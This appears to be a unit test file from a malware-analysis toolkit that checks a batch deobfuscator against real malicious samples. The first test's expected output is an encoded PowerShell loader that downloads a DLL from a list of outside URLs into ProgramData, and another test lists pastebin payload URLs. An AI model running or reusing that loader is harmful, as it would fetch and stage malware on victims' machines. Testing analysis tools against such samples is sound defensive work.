#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from .. import TestUnitBase


class TestBAT(TestUnitBase):

    def test_maldoc_extracted_bat_loader(self):
        xlx = self.download_sample('9472b3a4b2394975087d9ce9ce5b855de21f9fb7f98f17f3a973b1fd11959705')
        xtr = self.ldu('xlxtr', 'B115', 'B116')
        bat = self.load()
        out = str(B'\n'.join(xlx | xtr) | bat)
        self.assertEqual(out,
            'dir c:\\\nstart/B /WAIT powershell -enc JABqAGUAbwBsAGkAcwBlADMAUgBoAGcARABaAFMA'
            'NABjAGQAZgBnAD0AIgBoAHQAdABwADoALwAvAGcAbwB5AGEAbAB1AGEAdAAuAHYAbQBlAHMAaAAuAGkA'
            'bgAvADAAdgA2AGsAYwBuAHkALwBDAEcALwAsAGgAdAB0AHAAcwA6AC8ALwBtAGEAcgBzAC4AcwByAGwA'
            'LwB3AHAALQBhAGQAbQBpAG4ALwA3AEYAZgBrADYATABMAE4AMgBYAHMAMgBXAC8ALABoAHQAdABwADoA'
            'LwAvAGYAcgBhAG4AbQB1AGwAZQByAG8ALgBlAHMALwBtAGIAeAAvADgAYwA1AFIAQgBKAHgANgAvACwA'
            'aAB0AHQAcAA6AC8ALwB2AGEAcgBhAGYAbwBvAGQALgBjAG8AbQAvAEEAagBhAHgALwBjAG4ATQA5ADEA'
            'RwAvACwAaAB0AHQAcABzADoALwAvADcAagBjAGEAdAAuAGMAbwBtAC8AdwBwAC0AYwBvAG4AdABlAG4A'
            'dAAvAHQALwAsAGgAdAB0AHAAOgAvAC8AYgBsAG8AZwAuAGMAZQBuAHQAcgBhAGwAaABvAG0AZQAuAGgA'
            'dQAvAHcAcAAtAGMAbwBuAHQAZQBuAHQALwBwAEIAMQBSAGYAUABDAG4AQgBsAFMAMQBXAGYAcABjAE8A'
            'TAAvACwAaAB0AHQAcAA6AC8ALwB6AGkAbQByAGkAZwBoAHQAcwAuAGMAbwAuAHoAdwAvAG8AbABkAHMA'
            'aQB0AGUALwBrADAARQBvAEMAVwB5AGMAVQA5AHQATgBvADEAZAAvACwAaAB0AHQAcABzADoALwAvAG0A'
            'dQBkAGgAYQBuAGQAcwAuAGMAbwBtAC8AZQByAHIAbwByAC8AQgBmAEgALwAsAGgAdAB0AHAAOgAvAC8A'
            'YQBsAGIAYQB0AHIAbwBzAHAAYQB0AGEAZwBvAG4AaQBhAC4AYwBvAG0ALwBwAGgAawBjAHYAdAAvAHQA'
            'NQAzAGMAZQBTAE0ARABxAGcAUABRAGwAcQAvACwAaAB0AHQAcAA6AC8ALwBtAGEAcABjAG8AbQBtAHUA'
            'bgBpAGMAYQB0AGkAbwBuAHMALgBjAG8ALgB6AHcALwB3AHAALQBhAGQAbQBpAG4ALwBtAGQAUgBSAGIA'
            'UwBkAFUAMwBhAEIANwBYAHAAeAA2AHoALwAsAGgAdAB0AHAAOgAvAC8AbwBkAGMAbwBuAHMAdQBsAHQA'
            'LgBjAG8ALgB1AGsALwBBAEwARgBBAF8ARABBAFQAQQAvAEgASAByADAARgBxAE8AWABBAG4ANgAyAC8A'
            'LABoAHQAdABwADoALwAvAGQAdQBzAGgAawBpAG4ALgBuAGUAdAAvAGkAbQBnAC8AYgBoAFEAUwBUAE4A'
            'aQBjAEUATQB0AE4AUQB4AFAALwAiAC4AcwBwAEwAaQBUACgAIgAsACIAKQA7AGYATwByAGUAYQBDAGgA'
            'KAAkAGoAZAB0AEYASgBkAFgAaAByADYAdAB4AHkAaABkACAAaQBuACAAJABqAGUAbwBsAGkAcwBlADMA'
            'UgBoAGcARABaAFMANABjAGQAZgBnACkAewAkAHIAaAB5AGsAYQBqAGQAaABmAHMANwBpAGQAZgBnAGQA'
            'PQAiAGMAOgBcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAHYAYgBrAHcAawAuAGQAbABsACIAOwBpAE4A'
            'dgBPAGsAZQAtAHcARQBiAHIAZQBRAHUAZQBzAFQAIAAtAHUAUgBpACAAJABqAGQAdABGAEoAZABYAGgA'
            'cgA2AHQAeAB5AGgAZAAgAC0AbwB1AFQAZgBpAEwAZQAgACQAcgBoAHkAawBhAGoAZABoAGYAcwA3AGkA'
            'ZABmAGcAZAA7AGkAZgAoAHQAZQBzAHQALQBwAEEAdABIACAAJAByAGgAeQBrAGEAagBkAGgAZgBzADcA'
            'aQBkAGYAZwBkACkAewBpAGYAKAAoAGcAZQB0AC0AaQBUAGUAbQAgACQAcgBoAHkAawBhAGoAZABoAGYA'
            'cwA3AGkAZABmAGcAZAApAC4ATABlAG4AZwB0AGgAIAAtAGcAZQAgADQANQAwADAAMAApAHsAYgByAGUA'
            'YQBrADsAfQB9AH0A')

    def test_comments(self):
        unit = self.load()
        self.assertEqual(unit.process(b':: comment1'), b'')
        self.assertEqual(unit.process(b'::comment2'), b'')
        self.assertEqual(unit.process(b'rem comment3'), b'')

    def test_real_world_01(self):
        data = self.download_sample('6a1bc124f945ddfde62b4137d627f3958b23d8a2a6507e3841cab84416c54eea')
        out = data | self.load() | self.ldu('xtp', 'url') | {str}
        self.assertSetEqual(out, {
            'https'R':'R'//pastebin'R'.'R'com/raw/bLnD8FWX',
            'https'R':'R'//pastebin'R'.'R'com/raw/EZ88t5c1',
        })
